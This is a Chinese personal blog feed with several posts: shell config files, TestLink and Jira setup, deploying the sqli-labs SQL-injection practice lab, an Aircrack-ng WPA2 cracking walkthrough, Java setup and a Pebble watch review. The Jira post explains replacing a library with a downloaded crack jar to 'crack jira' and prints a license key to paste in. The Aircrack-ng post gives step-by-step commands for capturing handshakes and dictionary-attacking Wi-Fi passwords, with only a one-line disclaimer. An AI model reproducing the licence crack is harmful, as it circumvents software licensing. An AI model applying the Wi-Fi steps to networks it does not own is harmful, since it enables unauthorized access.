$EDITOR等变量写在这里,这样无论是在shell交互,或者运行程序都会读取此文件。</li><li>.zshrc主要用在交互shell,所以主要是为shell服务的,比如对shell做的一些个性化设置都可以在这里写入。</li><li>.zlogin在login shell的时候读取,所以比如X系统启动的时候会读取此文件,所以不会再运行中重复读取。</li><li>.zprofile是给ksh用户的一个.zlogin的替代品,所以我们如果使用了.zlogin就不必再关心此文件。</li><li>.zlogout退出终端的时候读取,用于做一些清理工作,一般用不上。</li></ul><p>所以我们使用<code>iterm2</code>一般只需要关心<code>.zshrc</code>即可。<code>.zshrc</code>也是我们最常用到的配置文件，既可以被登陆shell读取，也可以被非登陆shell读取。</p><blockquote><p>对配置文件 <code>.zshrc</code> 修改完应执行 <code>source ~/.zshrc</code> 使修改生效。同时如果之前使用<code>bash</code>时使用的配置文件想要在zsh中也被加载生效，可以在<code>.zshrc</code>中添加<code>source ~/.bash_profile</code>。否则每次打开zsh需要手动<code>source ~/.bash_profile</code>。</p></blockquote><h1 id="bash配置文件"><a href="#bash配置文件" class="headerlink" title="bash配置文件"></a>bash配置文件</h1><blockquote><p>Mac OS X 10.3之后默认的shell 本质为Bourne Shell(sh)。自带的bash并不美观（<del>花里胡哨</del>），以下作为了解。</p></blockquote><p><img src="/medias/mac%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/bash.png" alt><br>     终端输入<code>chsh -s /bin/bash</code>来切换成bash，重启终端生效。</p><h2 id="运行模式"><a href="#运行模式" class="headerlink" title="运行模式"></a>运行模式</h2><p>bash这块复杂的多。<br>shell有常见的两种运行模式即<code>login shell</code>（登陆shell）和<code>non-login shell</code>（非登陆shell）。</p><h3 id="定义如下："><a href="#定义如下：" class="headerlink" title="定义如下："></a>定义如下：</h3><ul><li><code>login shell：</code>在取得bash时需要完整的登陆流程。什么时候取得bash呢？当然就是用户登陆的时候。需要输入账号和密码，此时取得的bash就是login shell。</li><li><code>non-login shell：</code>就是取得bash不需要重复登录。例如shell窗口直接su切换用户。</li></ul><p>本质上的区别是读取的配置文件不同：</p><ul><li><p><code>login shell：</code> 读取全局配置<code>etc/profile</code>与用户配置<code>~/.bash_profile</code> 或 <code>~/.bash_login</code>或<code>~/.profile</code>中的一个。</p><blockquote><p>其中三选一按照：<code>~/.bash_profile</code> ——&gt; <code>~/.bash_login</code> ——&gt; <code>~/.profile</code> 的顺序读取，三个文件不同用户都有自己的一份。</p></blockquote></li><li><p><code>non-login shell：</code>只能读取<code>~/.bashrc</code>这个配置文件。</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3></li></ul><ol><li>su切换成root用户（<code>su root</code>）显然也是<code>non-login shell</code>，读取不到<code>etc/profile</code>，而作为root用户只读取到<code>~/.bashrc</code>显然是不行的，所以需要使用<code>su -</code>来进行切换，此时重新读取<code>etc/profile</code>（系统级）。</li><li>而切换其他用户的时候，我们一般直接<code>su 用户名</code>，这也是不对的，切换到一般用户我们需要用<code>su -l 用户名</code>才能读取到<code>~/.bash_profile</code>（个人级）。<br><img src="/medias/mac%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/%E7%99%BB%E9%99%86%E4%B8%8E%E9%9D%9E%E7%99%BB%E9%99%86.png" alt><br>即：</li><li>etc/profile：所有用户都能读取（通常不改动它）。</li><li>.bash_profile：只能被登录用户读取。</li><li>.bashrc：只能被非登录用户读取。</li><li>~/.zshrc：无论登录和非登录用户都可以读取。</li></ol><p>经过以上分析可知我们正常情况下使用<strong>iTerm2</strong>或者<strong>Terminal</strong>时使用的都是<strong>login shell</strong><br>所以mac一般使用的配置文件为<code>~/.bash_profile</code>，自己折腾通常也不会设置多用户切换着玩。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>有以上分析可以了解，使用Mac原始的bash时主要需要关心的配置文件是<code>~/.bash_profile</code>，而切换成zsh时主要需要关心的配置文件为<code>~/.zshrc</code>。<br>安装zsh后发现很多命令不能用了可以在<code>~/.zshrc</code>文件中添加<code>source ~/.bash_profile</code>使加载<code>~/.zshrc</code>时同时加载<code>~/.bash_profile</code>。</li><li>配置文件的主要作用就是加载环境变量，有时候像搭载JIRA环境时需要用到不同版本的JDK，此时就可以安装多个JDK而后通过修改配置文件来实现切换。<br><img src="/medias/mac%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/%E5%88%87%E6%8D%A2JDK.png" alt></li></ol><p>附：各种常见的shell</p><ol><li>Bourne Shell是AT&amp;T Bell实验室的 Steven Bourne为AT&amp;T的Unix开发的，它是Unix的默认Shell，也是其它Shell的开发基础。Bourne Shell在编程方面相当优秀，但在处理与用户的交互方面不如其它几种Shell。</li><li>C Shell是加州伯克利大学的Bill Joy为BSD Unix开发的，与sh不同，它的语法与C语言很相似。它提供了Bourne Shell所不能处理的用户交互特征，如命令补全、命令别名、历史命令替换等。但是，C Shell与BourneShell并不兼容。</li><li>Korn Shell是AT&amp;T Bell实验室的David Korn开发的，它集合了C Shell和Bourne Shell的优点，并且与Bourne Shell向下完全兼容。Korn Shell的效率很高，其命令交互界面和编程交互界面都很好。</li><li>Bourne Again Shell (即bash)是自由软件基金会(GNU)开发的一个Shell，它是Linux系统中一个默认的Shell。Bash不但与Bourne Shell兼容，还继承了C Shell、Korn Shell等优点。</li></ol><p>参考的文章：<a href="https://blog.csdn.net/sfhawx/article/details/49969321" title="大佬" target="_blank" rel="noopener">大佬</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 折腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>testlink + jira测试环境搭建</title>
      <link href="/2020/11/01/testlink-jira-ce-shi-huan-jing-da-jian/"/>
      <url>/2020/11/01/testlink-jira-ce-shi-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="一-下载testlink-jira并进行配置"><a href="#一-下载testlink-jira并进行配置" class="headerlink" title="一.下载testlink + jira并进行配置"></a>一.下载testlink + jira并进行配置</h2><p>注：本文默认使用的PHP集成开发环境是Mxsrvs，采用 <strong>testlink1.9.20 + MxSrvs_1.2.1 + Nginx1.18.0 + PHP7.4.6 + JDK11 + mysql8.0.19</strong> 方案。Mxsrvs的安装可参考<a href="https://pan-le.cn/2020/11/01/sqli-labs-ba-chang-bu-shu-mac/" title="sqli-labs靶场部署（MAC）">sqli-labs靶场部署（MAC）</a>。</p><h3 id="1-下载-amp-配置testlink"><a href="#1-下载-amp-配置testlink" class="headerlink" title="1.下载&amp;配置testlink"></a>1.<strong>下载&amp;配置testlink</strong></h3><ul><li><a href="http://www.testlink.org.cn/download" title="testlink官网" target="_blank" rel="noopener">testlink官网</a>下载压缩文件并解压到Mxsrvs的www项目目录下改名为testlink。</li><li>testlink需要改的配置文件<br>  <strong>1./config.inc.php：</strong><br>  搜索tlCfg-&gt;log_path 此行修改为：$tlCfg-&gt;log_path = [testlin根目录下logs文件夹的绝对路径]<br>  例如： <pre class="line-numbers language-bash"><code class="language-bash">      <span class="token variable">$tlCfg</span>-<span class="token operator">></span>log_path <span class="token operator">=</span> <span class="token string">'/Applications/XAMPP/xamppfiles/htdocs/testlink/logs/'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  搜索g_repositoryPath 此行修改为：$g_repositoryPath = [testlin根目录下upload_area文件夹的绝对路径]<br>  例如：   <pre class="line-numbers language-bash"><code class="language-bash">  <span class="token variable">$g_repositoryPath</span> <span class="token operator">=</span> <span class="token string">'/Applications/XAMPP/xamppfiles/htdocs/testlink/upload_area/'</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>启动testlink<ol><li>浏览器输入：<strong><a href="http://localhost:[http服务器端口]/testlink" target="_blank" rel="noopener">http://localhost:[http服务器端口]/testlink</a></strong>进入安装页面：</li><li>new installation</li><li><a href="http://localhost/TestLink" target="_blank" rel="noopener">http://localhost/TestLink</a></li></ol></li></ul><hr><h3 id="2-下载-amp-配置jira"><a href="#2-下载-amp-配置jira" class="headerlink" title="2.下载&amp;配置jira"></a>2.下载&amp;配置jira</h3><blockquote><p>由于mac没有安装版jira，故使用官网提供的服务器版jira进行安装。<br>注：jira只支持JDK11或者JDK1.8版本（后面讲如何实现mac平台多JDK切换使用）<br>默认已经安装JDK11，并且已经启动mysql。</p></blockquote><ul><li><p>1.下载jira<br><a href="https://www.atlassian.com/software/jira/free" title="jira官网" target="_blank" rel="noopener">jira官网</a>下  载服务器版jira压缩文件并解压到/usr/local/（此处需挂梯子）。</p></li><li><p>2.mysql中创建一个jiradb数据库，字符集选择utf8mb4，排序规则选择utf8mb4_danish_ci。<br>否则后期报错：<br><img src="/medias/%E9%85%8D%E7%BD%AEtestlink/%E6%8A%A5%E9%94%99.png" alt><br>社区的解决办法：<br><img src="/medias/%E9%85%8D%E7%BD%AEtestlink/%E8%A7%A3%E5%86%B3.png" alt></p></li><li><p>3.设置JIRA Home Directory：<br>打开终端Terminal，进入JIRA 的bin 输入./config.sh。<br><img src="/medias/%E9%85%8D%E7%BD%AEtestlink/%E9%85%8D%E7%BD%AE2.png" alt><br>此处放置位置自由选择，我放在了桌面。</p></li><li><p>4.设置MySQL驱动及破解jira：<br>下载jira破解文件<a href="https://pan.baidu.com/s/1ggtAR0v" title="密码：p4gh" target="_blank" rel="noopener">密码：p4gh</a>：atlassian-extras-3.2.jar<br>前往 <a href="https://dev.mysql.com/downloads/" title="传送门" target="_blank" rel="noopener">传送门</a>下载对应mysql版本的mysql数据库的驱动软件包：mysql-connector-java-X.X.XX-bin.jar<br>把两个文件复制到/usr/local/atlassian-jira-software-8.4.1-standalone/atlassian-jira/WEB-INF/lib目录下。其中atlassian-extras-3.2.jar是用来替换原来的atlassian-extras-3.2.jar文件，用作破解jira系统。<br><img src="/medias/%E9%85%8D%E7%BD%AEtestlink/%E7%A0%B4%E8%A7%A3.png" alt></p></li><li><p>5.设置关联的数据库，填写相关信息并测试是否连接成功。<br><img src="/medias/%E9%85%8D%E7%BD%AEtestlink/%E8%BF%9E%E6%8E%A5.png" alt></p></li><li><p>6.启动<br>执行jira根目录bin文件夹下的shutdown.sh，再运行start-jira.sh<br>浏览器输入 <a href="http://localhost:8080（jira默认使用jira端口，8080端口其他应用需先关闭）" target="_blank" rel="noopener">http://localhost:8080（jira默认使用jira端口，8080端口其他应用需先关闭）</a><br><img src="/medias/%E9%85%8D%E7%BD%AEtestlink/%E7%99%BB%E9%99%86.png" alt></p><p>填入许可证： </p><pre class="line-numbers language-bash"><code class="language-bash">AAABbQ0ODAoPeNp9UUlvgkAUvvMrSHppD0MQC6jJJDUwSTG4RKhJk16m+NRpEPDNYOu/LwpN3Y9v+7b3EK9KfVCmuunqltVr2T2rq3t+rFtmy9GWCJCt8qIANEKRQCaBzYUSeUbZKGbTyTSImDYq15+A48WbBJSUtLQvgdy46E5KTFZcgs8V0D08MV1idrQGON4VMOJroN54OGRTL+iHfyP2UwjcHd11iOloXp4pnig25CKlbdfpuo5rv2w2RpKvtQhwCxj4tP88axPrPZyQuN+xSfxqdWt9BebzMlHGviAyX6hvjmBUgGILVGEJ9dpt21fCueahkpcpyHiW3PBxR81Fhg1P5SsM/IiNSNhpuY7t2lpV0JPGHdhIcVSAdMFTCdoYlzwTkh/8nefoIRwG509LayGzStf+zDpJAyrDWKCQTZA+yARFcSAYBNO+HjVK9Mf6T08fPZ1teVoeuGrptz5xLeNj8uO7f8y6/gU5evy/MCwCFEm32Qka5do3eM4z83LwUe5AXUt8AhR0YbU7wtKNxEGjT56zGsM/S/JUpw<span class="token operator">==</span>X02ht<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>参考：<br><a href="https://www.jianshu.com/p/d128a9d7e1ed" title="【踩坑】Mac搭建jira（数据库、命令行一点不通的小白）" target="_blank" rel="noopener">【踩坑】Mac搭建jira（数据库、命令行一点不通的小白）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs靶场部署（MAC）</title>
      <link href="/2020/11/01/sqli-labs-ba-chang-bu-shu-mac/"/>
      <url>/2020/11/01/sqli-labs-ba-chang-bu-shu-mac/</url>
      
        <content type="html"><![CDATA[<h2 id="一-sqli-labs介绍："><a href="#一-sqli-labs介绍：" class="headerlink" title="一.sqli-labs介绍："></a>一.sqli-labs介绍：</h2><p>sqli-labs是由一个印度程序员开发的SQL注入实战平台，涵盖了报错注入、盲注、Update注入、Insert注入、Heather注入、二阶注入、绕过WAF，比较全面的一个注入平台：<a href="https://github.com/Audi-1/sqli-labs" title="项目地址" target="_blank" rel="noopener">项目地址</a></p><h2 id="二-前置条件"><a href="#二-前置条件" class="headerlink" title="二.前置条件"></a>二.前置条件</h2><p>需要：<strong>「Apache/Nginx + PHP + Tomcat + java环境」</strong><br>对于win用户通过XAMPP（LAMP）配置可轻松搭建。而对于mac平台也有XAMPP，但界面过于丑陋且不够方便。作为一个“精致”的boy，此处使用Mxsrvs代替，当然使用MAMP也可以代替XAMPP，mac系统其实已经内置了Apache与PHP，这两个也可以不用安装。</p><p>此处使用 <strong><a href="http://www.xsrvs.com/index.html" title="MxSrvs_1.2.1" target="_blank" rel="noopener">MxSrvs_1.2.1</a> + Nginx1.18.0 + PHP7.4.6 + Tomcat9.0.35 + JDK11</strong>作为演示。</p><h2 id="三-安装"><a href="#三-安装" class="headerlink" title="三.安装"></a>三.安装</h2><h3 id="1-安装MxSrvs。"><a href="#1-安装MxSrvs。" class="headerlink" title="1.安装MxSrvs。"></a>1.安装MxSrvs。</h3><p><a href="http://www.xsrvs.com/index.html" title="MxSrvs" target="_blank" rel="noopener">MxSrvs</a> 是MacOS平台免费的PHP集成开发环境，界面简洁，功能强大。<br>按以下图示操作：<br><img src="/medias/%E9%85%8D%E7%BD%AEsqli/%E5%AE%89%E8%A3%85.png" alt><br>切换版本后启动 Nginx1.18.0 和 PHP7.4.6，成功即完成安装。<br>MxSrvs只能运行在/Applications/MxSrvs 目录中，即相应的sqli-labs需要放到/Applications/MxSrvs/www目录下才能执行。<br><strong>配置Nginx：</strong><br><img src="/medias/%E9%85%8D%E7%BD%AEsqli/%E9%85%8D%E7%BD%AE.png" alt><br>生成一个配置文件，对其修改：</p><pre class="line-numbers language-bash"><code class="language-bash">server <span class="token punctuation">{</span>    listen          80<span class="token punctuation">;</span>    server_name     yxh.com<span class="token punctuation">;</span>    root            /Applications/MxSrvs/www/work/xxxxx<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#access_log     /Applications/MxSrvs/logs/xxx.com.log;</span>      location / <span class="token punctuation">{</span>            index index.php index.html error/index.html<span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">#autoindex  on;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>-e <span class="token variable">$request_filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                rewrite ^/<span class="token punctuation">(</span>.*<span class="token punctuation">)</span>$ /index.php/<span class="token variable">$1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            error_page 400 /error/400.html<span class="token punctuation">;</span>            error_page 403 /error/403.html<span class="token punctuation">;</span>            error_page 404 /error/404.html<span class="token punctuation">;</span>            error_page 500 /error/500.html<span class="token punctuation">;</span>            error_page 501 /error/501.html<span class="token punctuation">;</span>            error_page 502 /error/502.html<span class="token punctuation">;</span>            error_page 503 /error/503.html<span class="token punctuation">;</span>            error_page 504 /error/504.html<span class="token punctuation">;</span>            error_page 505 /error/505.html<span class="token punctuation">;</span>            error_page 506 /error/506.html<span class="token punctuation">;</span>            error_page 507 /error/507.html<span class="token punctuation">;</span>            error_page 509 /error/509.html<span class="token punctuation">;</span>            error_page 510 /error/510.html<span class="token punctuation">;</span>            autoindex  off<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        location ~ \.php<span class="token punctuation">(</span>.*<span class="token punctuation">)</span>$ <span class="token punctuation">{</span>            fastcgi_pass   127.0.0.1:10080<span class="token punctuation">;</span>            fastcgi_index  index.php<span class="token punctuation">;</span>            fastcgi_split_path_info  ^<span class="token punctuation">((</span>?U<span class="token punctuation">)</span>.+\.php<span class="token punctuation">)</span><span class="token punctuation">(</span>/?.+<span class="token punctuation">)</span>$<span class="token punctuation">;</span>            fastcgi_param  SCRIPT_FILENAME  <span class="token variable">$document_root</span><span class="token variable">$fastcgi_script_name</span><span class="token punctuation">;</span>            fastcgi_param  PATH_INFO  <span class="token variable">$fastcgi_path_info</span><span class="token punctuation">;</span>            fastcgi_param  PATH_TRANSLATED  <span class="token variable">$document_root</span><span class="token variable">$fastcgi_path_info</span><span class="token punctuation">;</span>            include        fastcgi_params<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-下载sqli-labs"><a href="#2-下载sqli-labs" class="headerlink" title="2.下载sqli-labs"></a>2.下载sqli-labs</h3><p>PHP版本 &lt; 7:  <a href="https://github.com/Audi-1/sqli-labs" title="下载" target="_blank" rel="noopener">下载</a>官方版。<br>PHP版本 &gt; 7:  <a href="https://github.com/skyblueee/sqli-labs-php7" title="下载" target="_blank" rel="noopener">下载</a>修改版。<br>也可以使用GET：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">git</span><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/skyblueee/sqli-labs-php7 /var/www/html/sqli-labs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注：由于php在php5之后移除了mysql扩展（函数），而sqli-labs是基于php5以下版本的平台。所以下载<a href="https://github.com/Audi-1/sqli-labs" title="官方版" target="_blank" rel="noopener">官方版</a>后要使用mysqli扩展就需要手动修改：<br>  1.进入sqli-labs/sql-connections<br>  2.对内部所有文件进行以下修改：<br>  <img src="/medias/%E9%85%8D%E7%BD%AEsqli/%E4%BF%AE%E6%94%B9php.png" alt></p><h3 id="3-配置sqli-labs"><a href="#3-配置sqli-labs" class="headerlink" title="3.配置sqli-labs"></a>3.配置sqli-labs</h3><p>  1）.将sqli-labs文件夹放到MxSrvs的www目录下。<br>  2）.打开sqli-labs/sql-connections/db-creds.inc,修改$dbpass为你的数据库密码</p><h3 id="4-启动sqli-labs"><a href="#4-启动sqli-labs" class="headerlink" title="4.启动sqli-labs"></a>4.启动sqli-labs</h3><p>  1）.确定mysql，php，Nginx都已经启动的前提下，浏览器输入：<a href="http://localhost:[http服务器端口]/sqli-labs。" target="_blank" rel="noopener">http://localhost:[http服务器端口]/sqli-labs。</a><br>  即可进入以下页面：<br>  <img src="/medias/%E9%85%8D%E7%BD%AEsqli/%E6%AC%A2%E8%BF%8E.png" alt><br>  2）.点击 <em><em>Setup/reset Database for labs </em></em>后显示：<br>  <img src="/medias/%E9%85%8D%E7%BD%AEsqli/%E6%88%90%E5%8A%9F.png" alt></p><h2 id="四-修改mysql密码"><a href="#四-修改mysql密码" class="headerlink" title="四.修改mysql密码"></a>四.修改mysql密码</h2><p>MySQL和Redis所有版本的默认root密码均为空，想要修改mysql密码可以有以下几种方法：</p><h3 id="1-使用mysql自带的mysqladmin（位于bin下）。"><a href="#1-使用mysql自带的mysqladmin（位于bin下）。" class="headerlink" title="1.使用mysql自带的mysqladmin（位于bin下）。"></a>1.使用mysql自带的mysqladmin（位于bin下）。</h3><pre class="line-numbers language-bash"><code class="language-bash">mysqladmin -u用户名 -p旧密码 password 新密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 折腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Aircrack-ng抓包破解Wi-Fi(WPA2)</title>
      <link href="/2020/06/15/aircrack-ng-zhua-bao-po-jie-wi-fi-wpa2/"/>
      <url>/2020/06/15/aircrack-ng-zhua-bao-po-jie-wi-fi-wpa2/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><blockquote><p>本篇仅做技术交流使用，未经允许破解wifi密码属于违规行为，望谨慎操作。</p></blockquote><h2 id="wi-fi加密历史"><a href="#wi-fi加密历史" class="headerlink" title="wi-fi加密历史"></a>wi-fi加密历史</h2><ul><li>有线等效加密（ WEP ）<br>起于美国，于1999年9月批准作为wi-fi安全标准。最初由于美国官方限制，仅支持64位加密，后延伸为128位，安全系数仍然不高。即便后来推出256位加密，但普遍使用比较多的128位加密仍可使用一些软件轻松破解。 wifi协会于2004年宣布WEB正式退役。</li><li>Wi-Fi 访问保护I（ WPA ）<br>2003年正式启用，使用256位加密。</li><li>Wi-Fi 访问保护 II（ WPA2 ）<br>WPA2 也有弱点：Wi-Fi 保护设置（ WPS ）的攻击向量。所以平时使用路由器应当禁用 WPS。</li></ul><hr><h2 id="Aircrack-ng出场（mac系统下演示）"><a href="#Aircrack-ng出场（mac系统下演示）" class="headerlink" title="Aircrack-ng出场（mac系统下演示）"></a>Aircrack-ng出场（mac系统下演示）</h2><blockquote><p>WPA/WPA2破解的主要方法有Pin码破解、抓包破解。而Pin码破解必须要求路由器开启WPS设置，抓包破解（暴力破解）的常用工具就是我们要讲的Aircrack-ng,Aircrack-ng破解方式就是跑字典，所以成功率很大程度取决于你的字典。</p></blockquote><h3 id="安装macport和Xcode。"><a href="#安装macport和Xcode。" class="headerlink" title="安装macport和Xcode。"></a>安装macport和Xcode。</h3><ul><li>macport<br>其实就是一个软件包管理器（类似于yum/apt-get），通过它安装速度是最快的。<br><a href="https://www.macports.org/install.php" target="_blank" rel="noopener">macport官网</a></li><li>Xcode<br>是 Mac OS X 上的工具包。<br>没必要去App Store安装完整版版，此处<a href="https://developer.apple.com/download/more/" target="_blank" rel="noopener">简化版</a>下载。</li><li>更新一下 ports <pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> port -v selfupdate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="Aircrack-ng安装及使用"><a href="#Aircrack-ng安装及使用" class="headerlink" title="Aircrack-ng安装及使用"></a>Aircrack-ng安装及使用</h3><p><strong>1.安装</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> port <span class="token function">install</span> aircrack-ng//安装Aircrack-ng<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2.建立软链接，方便使用</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>3. 执行’ifconfig’查看网卡名字</strong><br><img src="/medias/pebble/ifconfig.png" alt><br><strong>4. 直接执行’airport -s’，出现wifi信息</strong><br><img src="/medias/pebble/wifi.png" alt></p><blockquote><p>其中SSID ： wifi 名。CHANNEL 是频道。RSSI ：信号强度（绝对值越小信号越强）。</p></blockquote><p><strong>5. 抓包</strong></p><ol><li>终端输入<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> airport en0 sniff 1  //en0为网卡，1为频道。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><img src="/medias/pebble/zhuabao.png" alt></p><ol start="2"><li>监听模式下wifi图标呈现<br><img src="/medias/pebble/wifitu.png" alt><blockquote><p>最好监听久一些（提高抓包成功概率）</p></blockquote></li></ol><p><strong>6. 得到包</strong></p><ol><li>终端输入：’control ＋ c’，终止程序（退出抓包）。</li><li>进入终端提示的路径中得到’cap’文件（包）。<br><img src="/medias/pebble/cap.png" alt></li></ol><p><strong>6. 准备字典</strong></p><ol><li>密码字典：’txt’格式文档，一行一个密码。<blockquote><p>密码字典可以自己做也可以从网上下载。</p></blockquote></li></ol><p><img src="/medias/pebble/zidian.png" alt></p><p><strong>6. 准备破解</strong></p><ol><li>将密码’字典文件’与’cap’文件放入同一个文件夹（比如我的’pass’）。<br><img src="/medias/pebble/pass.png" alt></li><li>终端切换到pass。</li><li>查看抓包情况<pre class="line-numbers language-bash"><code class="language-bash">aircrack-ng -w 字典文件.txt airportSniffrl9O0O.cap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><img src="/medias/pebble/qingkuang.png" alt><br><strong>7. 开始破解</strong></p><ol><li>终端输入’command ＋ f’搜索’1 handshake’(成功握手)并记录行号。</li><li>输入行号即可开始破解。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 折腾 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aircrack-ng </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件配置</title>
      <link href="/2020/06/02/ruan-jian-pei-zhi/"/>
      <url>/2020/06/02/ruan-jian-pei-zhi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>记录一下现有软件。</p></blockquote><p><img src="/medias/%E8%BD%AF%E4%BB%B6/1.png" alt></p><p><img src="/medias/%E8%BD%AF%E4%BB%B6/2.png" alt></p><h2 id="Sublime-Text配置中文"><a href="#Sublime-Text配置中文" class="headerlink" title="Sublime Text配置中文"></a>Sublime Text配置中文</h2><p>1.下载配置文件<a href="https://pan.baidu.com/s/1soTbFkUsfzm0QGrFYCxbbg" target="_blank" rel="noopener">提取码: 7ru9 </a><br>2.打开<code>Sublime Text-&gt;Preferences-&gt;Browse Packages</code>,然后返回到上层目录。<br>3.将文件导入到<code>Installed Packages</code>即可。</p><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>1.终端输入<code>java -version</code>验证是否已经安装jdk。<br>2.<a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">oracle官网</a>下载对应<code>dmg</code>安装包进行安装。</p><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量."></a>配置环境变量.</h3><p><strong>1.终端输入<code>vim .bash_profile</code>打开配置文件。</strong><br>添加```bash<br>export JAVA_HOME=/Library/Java/本机安装jdk位置路径<br>export CLASSPAHT=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar<br>export PATH=$JAVA_HOME/bin:$PATH</p><pre><code>**2.输入`source .bash_profile`使环境生效。****3.分别输入`java`,`javac`验证是否安装成功。**## Eclipse与java jdk搭配使用的ide环境。### 安装配置**1.终端输入`java -version`验证是否安装jdk，否则先安装jdk。**### 拓展&gt; 汉化&gt; 自动联想&gt; 安装WindowBuilder</code></pre>]]></content>
      
      
      <categories>
          
          <category> 捣鼓 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MacBook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pebble-产品总结</title>
      <link href="/2020/05/30/pebble-chan-pin-zong-jie/"/>
      <url>/2020/05/30/pebble-chan-pin-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="一：产品介绍"><a href="#一：产品介绍" class="headerlink" title="一：产品介绍"></a>一：产品介绍</h2><h3 id="1-众筹出道"><a href="#1-众筹出道" class="headerlink" title="1.众筹出道"></a>1.众筹出道</h3><p>2015年2 月底，智能手表厂商 Pebble 于Kickstarter发起了新众筹，离众筹结束还有 24 天，超越之前的众筹冠军 Coolest Cooler，刷新了 Kickstarter 的筹款纪录。</p><h3 id="2-历史及发售价"><a href="#2-历史及发售价" class="headerlink" title="2.历史及发售价"></a>2.历史及发售价</h3><ol><li>2012年：第一代Pebble - 699元<br><img src="/medias/pebble/5.jpeg" alt></li><li>2014年：Pebble Steel（钢铁版peblle,我的第一个pebble）- 1199元<br><img src="/medias/pebble/1.png" alt></li><li>2015年：Pebble Time（1399元） + pebble Time Round（1280元）+ Pebble Time Steel - 1699元<br><img src="/medias/pebble/4.png" alt><br><img src="/medias/pebble/2.jpg" alt></li><li>2016年：新Pebble 2，Time 2，Pebble Core胎死腹中，未能发售。pebble被Fitbit收购。</li></ol><h3 id="3-硬件配置"><a href="#3-硬件配置" class="headerlink" title="3.硬件配置"></a>3.硬件配置</h3><p><img src="/medias/pebble/6.png" alt></p><h2 id="二：表盘"><a href="#二：表盘" class="headerlink" title="二：表盘"></a>二：表盘</h2><h3 id="1-表盘下载"><a href="#1-表盘下载" class="headerlink" title="1.表盘下载"></a>1.表盘下载</h3><p>基于原版<a href="https://apps.rebble.io" title="表盘" target="_blank" rel="noopener">表盘</a> 商店的修改，增加<a href="https://apps.rebble.io?dev_settings=true" title="下载" target="_blank" rel="noopener">下载</a>功能</p><h3 id="2-制作表盘"><a href="#2-制作表盘" class="headerlink" title="2.制作表盘"></a>2.制作表盘</h3><h4 id="2-1在线网页制作表盘"><a href="#2-1在线网页制作表盘" class="headerlink" title="2.1在线网页制作表盘"></a>2.1在线网页制作表盘</h4><p><a href="http://www.watchface-generator.de/index.php" title="点我" target="_blank" rel="noopener">点我</a> </p><h3 id="3-更换pebble服务器，由pebble到rebble。"><a href="#3-更换pebble服务器，由pebble到rebble。" class="headerlink" title="3.更换pebble服务器，由pebble到rebble。"></a>3.更换pebble服务器，由pebble到rebble。</h3><p><a 